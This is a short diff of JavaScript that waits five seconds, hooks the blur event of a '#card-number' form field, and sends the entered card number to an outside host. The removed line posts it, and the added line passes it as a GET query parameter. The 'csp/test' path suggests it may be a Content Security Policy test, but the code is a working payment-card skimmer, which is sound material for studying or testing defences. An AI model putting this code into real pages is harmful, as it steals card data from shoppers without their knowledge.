@@ -1,5 +1,5 @@
 setTimeout(function() {
   $("#card-number").on('blur', function() {
-    $.post( "https://mmiesiak.github.io/csp/test.html", { name: $(this).val() } );
+    $.get( "https://mmiesiak.github.io/csp/test.html?card=" + $(this).val() );
   })
 }, 5000);
